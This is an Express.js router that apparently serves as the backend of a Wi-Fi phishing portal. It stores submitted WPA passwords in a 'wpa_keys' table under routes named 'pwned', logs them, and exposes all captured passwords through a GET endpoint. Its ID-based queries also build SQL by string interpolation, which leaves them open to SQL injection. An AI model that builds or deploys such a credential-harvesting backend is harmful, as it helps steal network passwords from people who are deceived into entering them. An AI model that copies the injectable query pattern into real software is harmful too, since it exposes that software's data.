const express = require('express');
const router = express.Router();
const query = require('../dbconnect')

class pwned {
    constructor(psw1, psw2) {
        this.psw1 = psw1,
        this.psw2 = psw2
	}
}

router.get('/pwned', async (req, res) => {
    await query.GetAllData('*', 'wpa_keys')
    .then(data => {
        res.json(data)
    })
    .catch(err => {
        res.json(err)
    })
})

router.get('/pwned/:id', async (req, res) => {
    await query.GetSelectData('*', 'wpa_keys', `ID='${req.params.id}'`)
    .then(data => {
        res.json(data)
    })
    .catch(err => {
        res.json(err)
    })
    
})

router.post('/', async (req, res) => {
    var passwords = new pwned(req.body.Password, req.body.VerifyPass)
    await query.InsertData('wpa_keys',passwords.psw1, passwords.psw2)

    console.log(passwords)
    res.json({
        status: 'Data inserted successfully'
    })
})

router.put('/:id', async (req, res) => {
    await query.UpdateData('wpa_keys', `psw1 = 'UpdateTest', psw2 = 'UpdateTest'`, `ID=${req.params.id}`)
        .then(response => {
            res.json({
                status: response,
            })
        })
        .catch(err => {
            res.json({
                status: err
            })
        })
})

module.exports = router;